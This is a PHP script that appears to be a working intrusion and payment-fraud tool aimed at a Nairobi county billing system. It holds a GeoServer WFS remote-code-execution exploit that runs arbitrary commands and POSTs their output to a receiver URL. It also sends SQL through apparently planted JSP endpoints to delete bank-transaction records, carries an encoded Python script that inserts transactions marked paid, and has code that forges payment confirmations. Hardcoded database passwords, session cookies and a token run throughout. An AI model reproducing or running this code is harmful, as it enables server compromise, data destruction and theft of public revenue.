<?php
require 'vendor/autoload.php';

include './includes/core_auto.php';
include './includes/conn_auto.php';
include './includes/conn_pure.php';


class DatabaseDeep
{
    private $server = "mysql:host=srv677.hstgr.io;dbname=u117204720_deepwoods";
    private $username = "u117204720_deepwoods";
    private $password = 'Wj9|10g0oN';
    private $options  = array(
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
        PDO::ATTR_PERSISTENT => true,  // Use persistent connections
    );

    protected $conn;

    public function open()
    {
        try {
            $this->conn = new PDO($this->server, $this->username, $this->password, $this->options);
            return $this->conn;
        } catch (PDOException $e) {
            echo "There is some problem in connection: " . $e->getMessage();
        }
    }

    public function close()
    {
        $this->conn = null;
    }
}


$pdoDeep = new DatabaseDeep();

$connDeep = $pdoDeep->open();


function recLog($invoice, $data, $sql)
{
    global $conn;
    $stmt = $conn->prepare("INSERT INTO recLog (`inv`,`data`,`sql`) VALUES (:inv, :data, :sql)");
    $stmt->execute(['inv' => $invoice, 'data' => $data, 'sql' => $sql]);
    $response = $stmt->fetch();
    return $response;
}
//$data = '{"success":true,"invoiceNo":"BL-UBP-060215","amount":"7,500.00","pobox":"","postalcode":"","mobilenumber":"0720448244","applicationNo":"","external_doc":"","business_name":"","business_subsidiary_name":"","description":"-0 for ","dategenerated":"02\/15\/24","status":"Unpaid","customerno":"2020_350227","duedate":"02\/15\/24","customername":"MOSES MUHU NDEGWA","description":"UBP APPLICATION NO TLA063429 - 2020_350227"}';
function universal_dab($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/dab.jsp?sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}
function convertToISO8601($dateTimeString, $timezoneOffset = '+03:00')
{
    // Remove the microseconds part if it exists
    $dateTimeString = preg_replace('/\.\d+/', '', $dateTimeString);

    // Create a DateTime object from the original string
    $dateTime = new DateTime($dateTimeString, new DateTimeZone('UTC'));

    // Set the desired timezone
    $timezone = new DateTimeZone($timezoneOffset);
    $dateTime->setTimezone($timezone);

    // Format the DateTime object to the ISO 8601 format
    $iso8601DateTime = $dateTime->format('Y-m-d\TH:i:sP');

    return $iso8601DateTime;
}

function generateAccountNumber()
{
    // Get the current date and time
    $dateTime = date('YmdHi'); // Format: YYYYMMDDHHMMSS

    // Generate a random 4-digit number to complete the 16-digit account number
    $randomDigits = '';
    for ($i = 0; $i < 4; $i++) {
        $randomDigits .= mt_rand(0, 9);
    }

    // Concatenate the dateTime string and the random digits
    return $dateTime . $randomDigits;
}

function generateCurrentDateWithMidnightTime()
{
    // Create a DateTime object with the current date and time
    $dateTime = new DateTime();

    // Modify the time to "00:00:00"
    $dateTime->setTime(0, 0, 0);

    // Format the date in "d-m-Y H:i:s" format
    return $dateTime->format('d-m-Y H:i:s');
}
function bankTransactions_del($id)
{
    $q = "DELETE FROM bankTransactions WHERE id=" . $id;
    return universal_dab($q, 'bankTransactions');
}

function transactions($clientRefNo)
{
    //$q = "DELETE FROM transactions WHERE id=" . $id;
    $q = "DELETE FROM transactions WHERE clientRefNo='" . $clientRefNo . "'";
    return universal_dab($q, 'transactions');
}

function messenger($url, $headers = '', $payload = '', $method = 'GET')
{
    $url = 'http://192.168.2.142:8080/aggregate/messenger.jsp?url=' . urlencode($url) . '&headers=' . urlencode($headers) . '&payload=' . urlencode($payload) . '&method=' . urlencode($method);
    $data = httpGet($url, []);
    return $data;
}

function extractId($html)
{
    // Load the HTML into a DOMDocument object
    $dom = new DOMDocument();
    @$dom->loadHTML($html);

    // Use DOMXPath to query for the table data
    $xpath = new DOMXPath($dom);
    $idNode = $xpath->query("//table/tr/td")->item(0);

    // Return the text content of the node
    if ($idNode) {
        return $idNode->textContent;
    }
    return null;
}

function universal_dab_b($command, $head)
{
    $cmd = urlencode($command);
    $url = 'http://192.168.2.142:8080/aggregate/my.jsp?dbHost=192.168.0.65&dbName=upgw&dbUser=root&dbPassword=happycoding&dbPort=3306&sqlCommand=' . $cmd;
    $data = httpGet($url, []);
    $data = '<h2>' . $head . '</h2>' . $data . '<br/><br/><br/><br/>';
    return $data;
}

function ms_script()
{
    $script = 'aW1wb3J0IHN5cw0KaW1wb3J0IG9zDQoNCg0KIyBBZGQgdGhlIGRpcmVjdG9yaWVzIGNvbnRhaW5pbmcgc2l0ZS1wYWNrYWdlcyB0byB0aGUgc3lzdGVtIHBhdGgNCnN5cy5wYXRoLmluc2VydCgwLCBvcy5wYXRoLmFic3BhdGgob3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXyksICcuL215ZW52L0xpYi9zaXRlLXBhY2thZ2VzJykpKQ0KDQppbXBvcnQgcHlteXNxbA0KDQojIERhdGFiYXNlIGNvbm5lY3Rpb24gZGV0YWlscyBmb3IgZGJDb25uZWN0aW9uDQpkYkNvbm5lY3Rpb25fY29uZmlnID0gew0KICAgICdob3N0JzogJzE5Mi4xNjguMC42NScsDQogICAgJ3VzZXInOiAncm9vdCcsDQogICAgJ3Bhc3N3b3JkJzogJ2hhcHB5Y29kaW5nJywNCiAgICAnZGF0YWJhc2UnOiAndXBndycsDQogICAgJ3BvcnQnOiAzMzA2DQp9DQoNCiMgRGF0YWJhc2UgY29ubmVjdGlvbiBkZXRhaWxzIGZvciBkYkNvbm5lY3Rpb25hcGkNCmRiQ29ubmVjdGlvbmFwaV9jb25maWcgPSB7DQogICAgJ2hvc3QnOiAnMTkyLjE2OC4xMDAuNzMnLA0KICAgICd1c2VyJzogJ3Jvb3QnLA0KICAgICdwYXNzd29yZCc6ICdIYXBweWNvZGluZycsDQogICAgJ2RhdGFiYXNlJzogJ2RiX2FwaTFfc2VydmljZScsDQogICAgJ3BvcnQnOiAzMzA2DQp9DQoNCiMgQ29ubmVjdCB0byBhIE15U1FMIGRhdGFiYXNlDQpkZWYgY29ubmVjdF90b19kYihkYl9jb25maWcpOg0KICAgIHRyeToNCiAgICAgICAgY29ubmVjdGlvbiA9IHB5bXlzcWwuY29ubmVjdCgNCiAgICAgICAgICAgIGhvc3Q9ZGJfY29uZmlnWydob3N0J10sDQogICAgICAgICAgICB1c2VyPWRiX2NvbmZpZ1sndXNlciddLA0KICAgICAgICAgICAgcGFzc3dvcmQ9ZGJfY29uZmlnWydwYXNzd29yZCddLA0KICAgICAgICAgICAgZGF0YWJhc2U9ZGJfY29uZmlnWydkYXRhYmFzZSddLA0KICAgICAgICAgICAgcG9ydD1kYl9jb25maWdbJ3BvcnQnXSwNCiAgICAgICAgICAgIGNvbm5lY3RfdGltZW91dD0zMCwNCiAgICAgICAgICAgIGF1dG9jb21taXQ9VHJ1ZQ0KICAgICAgICApDQogICAgICAgIHJldHVybiBjb25uZWN0aW9uDQogICAgZXhjZXB0IHB5bXlzcWwuTXlTUUxFcnJvciBhcyBlOg0KICAgICAgICBwcmludChmIk15U1FMIEVycm9yOiB7ZX0iKQ0KICAgICAgICByZXR1cm4gTm9uZQ0KDQojIEZ1bmN0aW9uIHRvIGhhbmRsZSBpbnNlcnRpb25zIGludG8gdGhlIGJhbmtUcmFuc2FjdGlvbnMgdGFibGUNCmRlZiBpbnNlcnRfYmFua190cmFuc2FjdGlvbihjb25uZWN0aW9uLCB0cmFuc2FjdGlvbl9kYXRhKToNCiAgICB0cnk6DQogICAgICAgIGN1cnNvciA9IGNvbm5lY3Rpb24uY3Vyc29yKCkNCiAgICAgICAgaW5zZXJ0X3F1ZXJ5ID0gIiIiDQogICAgICAgICAgICBJTlNFUlQgSU5UTyBiYW5rVHJhbnNhY3Rpb25zIChiYW5rQ29kZSwgYmlsbE51bWJlciwgYW1vdW50LCBhY2N0UmVmTm8sIHRyYW5zYWN0aW9uUmVmLCB0cmFuUGFydGljdWxhciwgcGF5bWVudE1vZGUsIA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJhbnNhY0RhdGUsIG1vYmlsZU51bWJlciwgaW5zdGl0dXRpb25Db2RlLCBhcGlDb2RlLCBpbnN0aXR1dGlvbk5hbWUsIHRyYW5zdGF0dXMpIA0KICAgICAgICAgICAgVkFMVUVTICglcywgJXMsICVzLCAlcywgJXMsICVzLCAlcywgJXMsICVzLCAlcywgJXMsICVzLCAlcykNCiAgICAgICAgIiIiDQogICAgICAgIGN1cnNvci5leGVjdXRlKGluc2VydF9xdWVyeSwgdHJhbnNhY3Rpb25fZGF0YSkNCiAgICAgICAgY29ubmVjdGlvbi5jb21taXQoKQ0KICAgICAgICBwcmludChmIlRyYW5zYWN0aW9uIGluc2VydGVkIHN1Y2Nlc3NmdWxseToge3RyYW5zYWN0aW9uX2RhdGFbNF19IikNCiAgICBleGNlcHQgcHlteXNxbC5NeVNRTEVycm9yIGFzIGU6DQogICAgICAgIHByaW50KGYiTXlTUUwgRXJyb3IgZHVyaW5nIGluc2VydGlvbjoge2V9IikNCiAgICBmaW5hbGx5Og0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KDQojIEZ1bmN0aW9uIHRvIHVwZGF0ZSB0aGUgc3RhdHVzIG9mIGEgdHJhbnNhY3Rpb24gaW4gdGhlIGJhbmtUcmFuc2FjdGlvbnMgdGFibGUNCmRlZiB1cGRhdGVfdHJhbnNhY3Rpb25fc3RhdHVzKGNvbm5lY3Rpb24sIHRyYW5zYWN0aW9uX3JlZik6DQogICAgdHJ5Og0KICAgICAgICBjdXJzb3IgPSBjb25uZWN0aW9uLmN1cnNvcigpDQogICAgICAgIHVwZGF0ZV9xdWVyeSA9ICJVUERBVEUgYmFua1RyYW5zYWN0aW9ucyBTRVQgdHJhbnN0YXR1cyA9IDEgV0hFUkUgdHJhbnNhY3Rpb25SZWYgPSAlcyINCiAgICAgICAgY3Vyc29yLmV4ZWN1dGUodXBkYXRlX3F1ZXJ5LCAodHJhbnNhY3Rpb25fcmVmLCkpDQogICAgICAgIGNvbm5lY3Rpb24uY29tbWl0KCkNCiAgICAgICAgcHJpbnQoZiJUcmFuc2FjdGlvbiBzdGF0dXMgdXBkYXRlZCBmb3Ige3RyYW5zYWN0aW9uX3JlZn0iKQ0KICAgIGV4Y2VwdCBweW15c3FsLk15U1FMRXJyb3IgYXMgZToNCiAgICAgICAgcHJpbnQoZiJNeVNRTCBFcnJvciBkdXJpbmcgc3RhdHVzIHVwZGF0ZToge2V9IikNCiAgICBmaW5hbGx5Og0KICAgICAgICBjdXJzb3IuY2xvc2UoKQ0KDQojIFNhbXBsZSB0cmFuc2FjdGlvbiBkYXRhIHRvIGluc2VydCAoeW91IHdvdWxkIGdldCB0aGlzIGZyb20gdGhlIHJlcXVlc3QgYm9keSBpbiBhIHJlYWwgYXBwbGljYXRpb24pDQp0cmFuc2FjdGlvbl9kYXRhID0gKA0KICAgICcwMDMnLCAgICAgICAgICAgICAgICAgICAjIGJhbmtDb2RlDQogICAgJ1hYQk5YWCcsICAgICAgICAgICAjIGJpbGxOdW1iZXINCiAgICAxMjM0NSwgICAgICAgICAgICAgICAgICAgICAjIGFtb3VudA0KICAgICdYWEFSWFgnLCAgICAgICAgICAgICMgYWNjdFJlZk5vDQogICAgJ1hYVFJYWCcsICAgICAgICAjIHRyYW5zYWN0aW9uUmVmDQogICAgJ1hYVFBYWCcsICAgIyB0cmFuUGFydGljdWxhcg0KICAgICdjYXNoJywgICAgICAgICAgICAgICAgICAgIyBwYXltZW50TW9kZQ0KICAgICdYWFREWFgnLCAgICAjIHRyYW5zYWNEYXRlDQogICAgJ1hYTU5YWCcsICAgICAgICAgICAgICMgbW9iaWxlTnVtYmVyDQogICAgJ1hYSUNYWCcsICAgICAgICAgICAgICAgIyBpbnN0aXR1dGlvbkNvZGUNCiAgICAnWFhBQ1hYJywgICAgICAgICAgICAgICMgYXBpQ29kZQ0KICAgICdYWElOWFgnLCAgICAgICAjIGluc3RpdHV0aW9uTmFtZQ0KICAgIDAgICAgICAgICAgICAgICAgICAgICAgICAgIyB0cmFuc3RhdHVzIChpbml0aWFsbHkgMCwgdXBkYXRlZCBsYXRlcikNCikNCg0KIyBDb25uZWN0IHRvIGJvdGggZGF0YWJhc2VzDQpkYkNvbm5lY3Rpb24gPSBjb25uZWN0X3RvX2RiKGRiQ29ubmVjdGlvbl9jb25maWcpDQpkYkNvbm5lY3Rpb25hcGkgPSBjb25uZWN0X3RvX2RiKGRiQ29ubmVjdGlvbmFwaV9jb25maWcpDQoNCmlmIGRiQ29ubmVjdGlvbiBhbmQgZGJDb25uZWN0aW9uYXBpOg0KICAgIHRyeToNCiAgICAgICAgIyBJbnNlcnQgdHJhbnNhY3Rpb24gaW50byBkYkNvbm5lY3Rpb25hcGkgKGVxdWl2YWxlbnQgdG8gZGJDb25uZWN0aW9uYXBpIGluIHRoZSBjb250cm9sbGVyKQ0KICAgICAgICBpbnNlcnRfYmFua190cmFuc2FjdGlvbihkYkNvbm5lY3Rpb25hcGksIHRyYW5zYWN0aW9uX2RhdGEpDQoNCiAgICAgICAgIyBJbnNlcnQgdHJhbnNhY3Rpb24gaW50byBkYkNvbm5lY3Rpb24gKGVxdWl2YWxlbnQgdG8gZGJDb25uZWN0aW9uIGluIHRoZSBjb250cm9sbGVyKQ0KICAgICAgICBpbnNlcnRfYmFua190cmFuc2FjdGlvbihkYkNvbm5lY3Rpb24sIHRyYW5zYWN0aW9uX2RhdGEpDQoNCiAgICAgICAgIyBVcGRhdGUgdGhlIHN0YXR1cyBvZiB0aGUgdHJhbnNhY3Rpb24gaW4gZGJDb25uZWN0aW9uIChkYkNvbm5lY3Rpb24gaW4gdGhlIGNvbnRyb2xsZXIpDQogICAgICAgIHVwZGF0ZV90cmFuc2FjdGlvbl9zdGF0dXMoZGJDb25uZWN0aW9uLCB0cmFuc2FjdGlvbl9kYXRhWzRdKSAgIyB0cmFuc2FjdGlvbl9yZWYgaXMgYXQgaW5kZXggNA0KDQogICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOg0KICAgICAgICBwcmludChmIkdlbmVyYWwgRXJyb3I6IHtlfSIpDQoNCiAgICBmaW5hbGx5Og0KICAgICAgICAjIENsb3NlIHRoZSBjb25uZWN0aW9ucw0KICAgICAgICBpZiBkYkNvbm5lY3Rpb24gYW5kIGRiQ29ubmVjdGlvbi5vcGVuOg0KICAgICAgICAgICAgZGJDb25uZWN0aW9uLmNsb3NlKCkNCiAgICAgICAgaWYgZGJDb25uZWN0aW9uYXBpIGFuZCBkYkNvbm5lY3Rpb25hcGkub3BlbjoNCiAgICAgICAgICAgIGRiQ29ubmVjdGlvbmFwaS5jbG9zZSgpDQplbHNlOg0KICAgIHByaW50KCJGYWlsZWQgdG8gY29ubmVjdCB0byBvbmUgb3IgYm90aCBkYXRhYmFzZXMuIikNCg==';
    return $script;
}

function cmd($cmd, $receiver)
{

    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20an%20intersects%20against%20a%20point.%20%20This%20is%20functionally%20--%3E%0D%0A%3C!--%20equivalent%20to%20%3CNot%3E%3CDisjoint%3E.%20%20This%20call%20can%20be%20used%20by%20a%20%20%20%20--%3E%0D%0A%3C!--%20client%20application%20to%20select%20a%20feature%20clicked%20on.%20%20%0D%0A%0D%0A%20%20%20%20%20This%20will%20search%20through%20the%20dataset%20and%20return%20any%20polygons%20that%0D%0A%20%20%20%20%20contain%20the%20search%20point.%20%20%0D%0A%20%20%20%20%20%0D%0A%20%20%20%20%20If%20you%20were%20searching%20in%20a%20point%20or%20line%20dataset%2C%20you%20might%20want%0D%0A%20%20%20%20%20to%20make%20a%20little%20polygon%20to%20search%20with%20instead%20of%20a%20single%20point%0D%0A%20%20%20%20%20so%20the%20user%20doesnt%20have%20to%20*exactly*%20click%20on%20the%20(mathematically%0D%0A%20%20%20%20%20infinitely%20thin)%20line%20or%20point.%20%20%20%20%20%0D%0A%0D%0A%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3DWFS_getFeatureIntersects-1.0.xml%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%3D%0D%0A%20--%3E%0D%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.0.0%22%0D%0A%20%20outputFormat%3D%22GML2%22%0D%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0D%0A%20%20xmlns%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0D%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0D%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0D%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.0.0%2FWFS-basic.xsd%22%3E%0D%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0D%0A%20%20%20%20%3CFilter%3E%0D%0A%20%20%20%20%20%20%3CIntersects%3E%0D%0A%20%20%20%20%20%20%20%20%3CPropertyName%3Eeval(build(jdk.jshell.JShell.builder())%2C%20\'try%20%7B%0D%0A%20%20%20%20Process%20process%20%3D%20Runtime.getRuntime().exec(%22' . $cmd . '%22)%3B%0D%0A%20%20%20%20%0D%0A%20%20%20%20java.io.BufferedReader%20reader%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(process.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20output%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20String%20line%3B%0D%0A%20%20%20%20while%20((line%20%3D%20reader.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20output.append(line).append(%22%5Cn%22)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20reader.close()%3B%0D%0A%0D%0A%20%20%20%20String%20encodedOutput%20%3D%20java.util.Base64.getEncoder().encodeToString(output.toString().getBytes(%22UTF-8%22))%3B%0D%0A%0D%0A%20%20%20%20java.net.URL%20url%20%3D%20new%20java.net.URL(%22' . $receiver . '%22)%3B%0D%0A%20%20%20%20java.net.HttpURLConnection%20connection%20%3D%20(java.net.HttpURLConnection)%20url.openConnection()%3B%0D%0A%20%20%20%20connection.setRequestMethod(%22POST%22)%3B%0D%0A%20%20%20%20connection.setDoOutput(true)%3B%0D%0A%0D%0A%20%20%20%20byte%5B%5D%20postDataBytes%20%3D%20encodedOutput.getBytes(%22UTF-8%22)%3B%0D%0A%20%20%20%20java.io.OutputStream%20os%20%3D%20connection.getOutputStream()%3B%0D%0A%20%20%20%20os.write(postDataBytes)%3B%0D%0A%20%20%20%20os.flush()%3B%0D%0A%20%20%20%20os.close()%3B%0D%0A%0D%0A%20%20%20%20int%20responseCode%20%3D%20connection.getResponseCode()%3B%0D%0A%20%20%20%20System.out.println(%22Response%20Code%3A%20%22%20%2B%20responseCode)%3B%0D%0A%0D%0A%20%20%20%20java.io.BufferedReader%20in%20%3D%20new%20java.io.BufferedReader(new%20java.io.InputStreamReader(connection.getInputStream()))%3B%0D%0A%20%20%20%20StringBuilder%20response%20%3D%20new%20StringBuilder()%3B%0D%0A%20%20%20%20while%20((line%20%3D%20in.readLine())%20!%3D%20null)%20%7B%0D%0A%20%20%20%20%20%20%20%20response.append(line)%3B%0D%0A%20%20%20%20%7D%0D%0A%20%20%20%20in.close()%3B%0D%0A%0D%0A%20%20%20%20System.out.println(%22Response%3A%20%22%20%2B%20response.toString())%3B%0D%0A%7D%20catch%20(Exception%20e)%20%7B%0D%0A%20%20%20%20e.printStackTrace()%3B%0D%0A%7D\')%3C%2FPropertyName%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3Cgml%3APoint%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3Acoordinates%3E-74.817265%2C40.5296504%3C%2Fgml%3Acoordinates%3E%0D%0A%20%20%20%20%20%20%20%20%20%20%3C%2Fgml%3APoint%3E%0D%0A%20%20%20%20%20%20%20%20%3C%2FIntersects%3E%0D%0A%20%20%20%20%20%20%3C%2FFilter%3E%0D%0A%20%20%3C%2Fwfs%3AQuery%3E%0D%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
        CURLOPT_HTTPHEADER => array(
            'Host: 192.168.2.160:8080',
            'Cache-Control: max-age=0',
            'Accept-Language: en-US',
            'Upgrade-Insecure-Requests: 1',
            'Origin: http://192.168.2.160:8080',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: http://192.168.2.160:8080/geoserver/web/wicket/page?1',
            'Cookie: JSESSIONID=3F27C65F7F97A9A6FF7CDFA08D1FD12F'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}

function cmd2()
{


    $curl = curl_init();

    curl_setopt_array($curl, array(
        CURLOPT_URL => 'http://192.168.2.160:8080/geoserver/TestWfsPost',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_ENCODING => '',
        CURLOPT_MAXREDIRS => 10,
        CURLOPT_TIMEOUT => 0,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
        CURLOPT_CUSTOMREQUEST => 'POST',
        CURLOPT_POSTFIELDS => 'form_hf_0=&url=http%3A%2F%2F192.168.2.160%3A8080%2Fgeoserver%2Fwfs&body=%3C!--%20Performs%20a%20get%20feature%20with%20a%20bounding%20box%20filter.%20%20%20WFS_getFeatureBBOX-1.1.xml%20%20%20--%3E%0A%3C!--%20The%20BBOX%20filter%20is%20a%20convenience%20for%20a%20%3CNot%3E%3CDisjoint%3E%2C%20--%3E%0A%3C!--%20it%20fetches%20all%20features%20that%20spatially%20interact%20with%20the%20given%20box.%20--%3E%0A%3C!--%20This%20example%20also%20shows%20how%20to%20request%20specific%20properties%2C%20in%20this%20--%3E%0A%3C!--%20case%20we%20just%20get%20the%20STATE_NAME%20and%20PERSONS%20--%3E%0A%0A%3Cwfs%3AGetFeature%20service%3D%22WFS%22%20version%3D%221.1.0%22%0A%20%20xmlns%3Awfs%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%22%0A%20%20xmlns%3Aogc%3D%22http%3A%2F%2Fwww.opengis.net%2Fogc%22%0A%20%20xmlns%3Agml%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%22%0A%20%20xmlns%3Axsi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXMLSchema-instance%22%0A%20%20xsi%3AschemaLocation%3D%22http%3A%2F%2Fwww.opengis.net%2Fwfs%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20http%3A%2F%2Fschemas.opengis.net%2Fwfs%2F1.1.0%2Fwfs.xsd%22%3E%0A%20%20%3Cwfs%3AQuery%20typeName%3D%22topp%3Apf_markets%22%3E%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3ASTATE_NAME%3C%2Fwfs%3APropertyName%3E%0A%20%20%20%20%3Cwfs%3APropertyName%3Etopp%3APERSONS%3C%2Fwfs%3APropertyName%3E%0A%20%20%20%20%3Cogc%3AFilter%3E%0A%20%20%20%20%20%20%3Cogc%3ABBOX%3E%0A%20%20%20%20%20%20%20%20%3Cogc%3APropertyName%3Eexec(java.lang.Runtime.getRuntime()%2C%22python3%20opt%2Ftomcat%2Fwebapps%2Faggregate%2Fmaster.py%22)%3C%2Fogc%3APropertyName%3E%0A%20%20%20%20%20%20%20%20%3Cgml%3AEnvelope%20srsName%3D%22http%3A%2F%2Fwww.opengis.net%2Fgml%2Fsrs%2Fepsg.xml%234326%22%3E%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AlowerCorner%3E-75.102613%2040.212597%3C%2Fgml%3AlowerCorner%3E%0A%20%20%20%20%20%20%20%20%20%20%20%3Cgml%3AupperCorner%3E-72.361859%2041.512517%3C%2Fgml%3AupperCorner%3E%0A%20%20%20%20%20%20%20%20%3C%2Fgml%3AEnvelope%3E%0A%20%20%20%20%20%20%3C%2Fogc%3ABBOX%3E%0A%20%20%20%3C%2Fogc%3AFilter%3E%0A%20%20%3C%2Fwfs%3AQuery%3E%0A%3C%2Fwfs%3AGetFeature%3E&username=&password=',
        CURLOPT_HTTPHEADER => array(
            'Host: 192.168.2.160:8080',
            'Cache-Control: max-age=0',
            'Accept-Language: en-US',
            'Upgrade-Insecure-Requests: 1',
            'Origin: http://192.168.2.160:8080',
            'Content-Type: application/x-www-form-urlencoded',
            'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36',
            'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Referer: http://192.168.2.160:8080/geoserver/web/wicket/page?5',
            'Cookie: JSESSIONID=F94F1C0DF4E21079561DDF00D5809365'
        ),
    ));

    $response = curl_exec($curl);

    curl_close($curl);
    return $response;
}

if (isset($_GET['del'])) {
    $inv = urlencode($_GET['del']);
    $cmd = "SELECT id FROM bankTransactions WHERE billNumber='" . $inv . "' LIMIT 1";
    $sd1 = universal_dab_b($cmd, 'head');
    $id1 =  extractId($sd1);
    echo $id1 . '<br/><br/>';
    echo bankTransactions_del($id1) . '<br/><br/>';

    //$cmd2 = "SELECT id FROM transactions WHERE clientRefNo='" . $inv . "' LIMIT 1";
    //$sd2 = universal_dab_b($cmd2, 'head');
    //$id2 =  extractId($sd2);
    //echo $id2 . '<br/><br/>';
    echo transactions($inv) . '<br/><br/>';
} else {
    if (!isset($_POST['invoiceNo']) || !isset($_POST['amount']) || !isset($_POST['pay'])) {
        echo json_encode(['error' => 'incomplete request', 'payload' => $_POST]);
        die();
    }

    if (empty($_POST['invoiceNo']) || empty($_POST['amount'] || empty($_POST['pay']))) {
        echo json_encode(['error' => 'empty request', 'payload' => $_POST]);
        die();
    }



    $data = httpPost('https://kever.io/auto_process.php', ['invoiceNo' => $_POST['invoiceNo'], 'amount' => $_POST['amount']], ['Cookie: PHPSESSID=apr51tp5hki4qpk461mtt5c48e; authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE3MzAwMTk1NTksImV4cCI6MTczMDAyMzE1OSwidXNlcklkIjoiOTZfMSJ9.j9uGOtujf4sPgMcc54P60qc6EvyzcJhyM8bXR7gcCY4; visitorId=973ad0dd0c565ca2ae839d5ebef8447a']);
    //echo $data;
    //die();

    $validation = json_decode($data, true);

    $payType = $_POST['pay'];
    $postAmount = $_POST['amount'];
    if ($payType == 'set') {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    } elseif ($payType == 'custom') {
        $amt1 = floatval($postAmount);
    } else {
        $amt1 = floatval(str_replace(',', '', $validation['amount']));
    }



    $dt1 = ['invoiceNo' => $validation['invoiceNo'], 'invoiceAmt' => $amt1, 'client' => 0, 'id' => '1'];
    $dtt1 = [];
    $dtt1['name'] = '0';

    if (isset($validation['success'])) {

        if ($validation['success']) {

            if (isset($validation['status'])) {

                if ($validation['status'] == "Unpaid") {
                    //echo 'Target 3';
                    //die();
                    $parts = explode('-', $dt1['invoiceNo']); // Split the string by hyphen
                    $validationAmt = str_replace(",", "", $validation['amount']);
                    if ($parts[0] != 'BL' || $parts[1] == 'LR' || (int)$validationAmt == (int)$dt1['invoiceAmt']) {
                        $billAmt = $dt1['invoiceAmt'];
                        $bypass = ['amount' => $dt1['invoiceAmt'], 'invoice_no' => $dt1['invoiceNo'], 'success' => true, 'route' => 'yes', 'record' => 'yes', 'client' => $dtt1['name'], 'extdoc' => $validation['external_doc'], 'custname' => $validation['customername'], 'custcont' => $validation['mobilenumber']];
                        //echo json_encode($bypass) . '<br/>';


                        if (isset($bypass)) {

                            $newId = 6212481;
                            $newBal = 378760 + 500;
                            $custname = splitName($bypass['custname']);
                            if ($bypass['custcont'] == '' || $bypass['custcont'] == null) {
                                $bypass['custcont'] = '0700000000';
                            }
                            $custcont = normalizePhoneNumber($bypass['custcont']);
                            $timeFormats = getCurrentTimeFormats();
                            $bypassAmt = (float)$bypass['amount'];

                            $bypass['url'] = 'https://nairobiservices.go.ke/api/gateway/taifa/nrs/affirm';

                            //die(json_encode($url));

                            //$url = 'https://nairobiservices.go.ke/api/authentication/bill/confirm_payment';
